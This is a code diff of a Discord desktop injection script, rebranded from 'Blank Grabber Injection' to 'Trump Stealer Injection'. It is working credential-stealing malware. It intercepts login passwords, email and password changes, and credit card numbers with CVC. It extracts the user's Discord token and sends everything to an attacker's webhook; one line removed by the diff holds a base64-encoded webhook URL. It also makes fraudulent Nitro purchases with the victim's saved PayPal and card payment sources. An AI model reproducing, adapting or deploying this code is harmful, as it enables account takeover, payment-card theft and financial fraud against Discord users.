@@ -9,12 +9,12 @@ const {
   session
 } = require('electron');
 const config = {
-  webhook: atob('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='),
-  webhook_protector_key: 'test',
+  webhook: atob('%WEBHOOKHEREBASE64ENCODED%'),
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
-  embed_name: 'Blank Grabber Injection',
+  embed_name: 'Trump Stealer Injection',
   embed_icon: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
   embed_color: 5639644,
   injection_url: 'https://raw.githubusercontent.com/fuzzlesfixer/Discord-Injection-BG/refs/heads/main/injection-obfuscated.js',
@@ -497,35 +497,59 @@ const Purchase = async (token, id, _type, _time) => {
   }
 };
 const buyNitro = async token => {
-  const data = await fetchBilling(token);
-  if (!data) {
-    return 'Failed to Purchase ❌';
-  }
-  let IDS = [];
-  data.forEach(x => {
-    if (!x.invalid) {
-      IDS = IDS.concat(x.id);
+    const data = await fetchBilling(token);
+    if (!data) {
+      return 'Failed to Purchase ❌';
     }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
+  
+    let paypalIDs = [];
+    let otherIDs = [];
+  
+    // Séparer les sources de paiement entre PayPal et les autres
+    data.forEach(x => {
+      if (!x.invalid) {
+        if (x.type === 2) { // 2 = PayPal
+          paypalIDs.push(x.id);
         } else {
-          return 'Failed to Purchase ❌';
+          otherIDs.push(x.id);
         }
       }
+    });
+  
+
+    const tryPurchase = async (ids) => {
+      for (let sourceID of ids) {
+        const first = await Purchase(token, sourceID, 'boost', 'year');
+        if (first !== null) {
+          return first;
+        }
+  
+        const second = await Purchase(token, sourceID, 'boost', 'month');
+        if (second !== null) {
+          return second;
+        }
+  
+        const third = await Purchase(token, sourceID, 'classic', 'month');
+        if (third !== null) {
+          return third;
+        }
+      }
+      return null;
+    };
+  
+
+    let result = await tryPurchase(paypalIDs);
+    if (result !== null) {
+      return result;
     }
-  }
-};
+  
+    result = await tryPurchase(otherIDs);
+    if (result !== null) {
+      return result;
+    }
+  
+    return 'Failed to Purchase ❌';
+  };  
 const getNitro = flags => {
   switch (flags) {
     case 0:
@@ -992,7 +1016,7 @@ const nitroBought = async token => {
   const billing = await getBilling(token);
   const code = await buyNitro(token);
   const content = {
-    username: 'Blank Grabber Injection',
+    username: 'Trump Stealer Injection',
     content: code,
     avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
     embeds: [{
@@ -1055,102 +1079,74 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     });
   }
 });
-const logFilePath = path.join(os.homedir(), 'Desktop', 'discord_logs.txt');
-const writeLog = (message) => {
-    const logMessage = `[${new Date().toISOString()}] ${message}\n`;
-    fs.appendFileSync(logFilePath, logMessage);
-  };
+// const logFilePath = path.join(os.homedir(), 'Desktop', 'discord_logs.txt');
+// const writeLog = (message) => {
+//     const logMessage = `[${new Date().toISOString()}] ${message}\n`;
+//     fs.appendFileSync(logFilePath, logMessage);
+//   };
   
-  session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-    writeLog(`🚩 [Request Captured] URL: ${details.url}`);
-    writeLog(`🔍 [Method]: ${details.method}`);
-    writeLog(`📡 [Status Code]: ${details.statusCode}`);
-  
-    if (details.statusCode !== 200 && details.statusCode !== 202) {
-      writeLog(`❌ [Invalid Status Code] Skipping...`);
-      return;
+session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
+  if (details.statusCode !== 200 && details.statusCode !== 202) {
+    return;
+  }
+
+  let unparsed_data;
+  try {
+    unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+  } catch (err) {
+    return;
+  }
+
+  let data;
+  try {
+    if (unparsed_data.trim().startsWith('{')) {
+      data = JSON.parse(unparsed_data);
+    } else {
+      data = querystring.parse(unparsed_data);
     }
-  
-    let unparsed_data;
-    try {
-      unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-      writeLog(`📝 [Unparsed Data]: ${unparsed_data}`);
-    } catch (err) {
-      writeLog(`⚠️ [Error Parsing Data]: ${err}`);
-      return;
-    }
-  
-    let data;
-    try {
-      // Vérifie si le payload est du JSON ou encodé en URL
-      if (unparsed_data.trim().startsWith('{')) {
-        data = JSON.parse(unparsed_data); // Si le payload commence par '{', c'est du JSON
-      } else {
-        data = querystring.parse(unparsed_data); // Sinon, c'est probablement de l'URL-encoded
+  } catch (err) {
+    return;
+  }
+
+  let token;
+  try {
+    token = await execScript((webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]); }]), m)
+      .find(m => m?.exports?.default?.getToken !== void 0)
+      .exports.default.getToken());
+  } catch (err) {
+    return;
+  }
+
+  switch (true) {
+    case details.url.endsWith('login'):
+      login(data.login, data.password, token).catch(() => {});
+      break;
+
+    case details.url.endsWith('users/@me') && details.method === 'PATCH':
+      if (!data.password) {
+        return;
       }
-      writeLog(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
-    } catch (err) {
-      writeLog(`⚠️ [Data Parse Error]: ${err}`);
-      return;
-    }
-  
-    let token;
-    try {
-      token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-      writeLog(`🔑 [Token Retrieved]: ${token}`);
-    } catch (err) {
-      writeLog(`❌ [Token Retrieval Failed]: ${err}`);
-      return;
-    }
-  
-    switch (true) {
-      case details.url.endsWith('login'):
-        writeLog(`🔐 [Login Event Detected]`);
-        login(data.login, data.password, token).catch((err) => writeLog(`⚠️ [Login Error]: ${err}`));
-        break;
-  
-      case details.url.endsWith('users/@me') && details.method === 'PATCH':
-        writeLog(`🔧 [User Update Detected]`);
-        if (!data.password) {
-          writeLog(`⚠️ [No Password Provided]`);
-          return;
-        }
-        if (data.email) {
-          writeLog(`📧 [Email Change Detected]`);
-          emailChanged(data.email, data.password, token).catch((err) => writeLog(`⚠️ [Email Change Error]: ${err}`));
-        }
-        if (data.new_password) {
-          writeLog(`🔑 [Password Change Detected]`);
-          passwordChanged(data.password, data.new_password, token).catch((err) => writeLog(`⚠️ [Password Change Error]: ${err}`));
-        }
-        break;
-  
-      case details.url.endsWith('tokens') && details.method === 'POST':
-        writeLog(`💳 [Credit Card Info Detected]`);
-        try {
-          writeLog(`💾 [Card Data]: ${JSON.stringify(data)}`);
-          ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch((err) => writeLog(`⚠️ [Credit Card Capture Error]: ${err}`));
-        } catch (err) {
-          writeLog(`⚠️ [Card Data Parsing Failed]: ${err}`);
-        }
-        break;
-  
-      case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-        writeLog(`💰 [PayPal Info Added]`);
-        PaypalAdded(token).catch((err) => writeLog(`⚠️ [PayPal Capture Error]: ${err}`));
-        break;
-  
-      case details.url.endsWith('confirm') && details.method === 'POST':
-        writeLog(`🚀 [Purchase Confirmed, Initiating Nitro Buy]`);
-        setTimeout(() => {
-          nitroBought(token).catch((err) => writeLog(`⚠️ [Nitro Purchase Error]: ${err}`));
-        }, 7500);
-        break;
-  
-      default:
-        writeLog(`ℹ️ [Unhandled Request Type]`);
-        break;
-    }
-  });  
+      if (data.email) {
+        emailChanged(data.email, data.password, token).catch(() => {});
+      }
+      if (data.new_password) {
+        passwordChanged(data.password, data.new_password, token).catch(() => {});
+      }
+      break;
+
+    case details.url.endsWith('tokens') && details.method === 'POST':
+      try {
+        ccAdded(data['card[number]'], data['card[cvc]'], data['card[exp_month]'], data['card[exp_year]'], token).catch(() => {});
+      } catch (err) {}
+      break;
+
+    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
+      PaypalAdded(token).catch(() => {});
+      break;
+
+    default:
+      break;
+  }
+});
 
 module.exports = require('./core.asar');
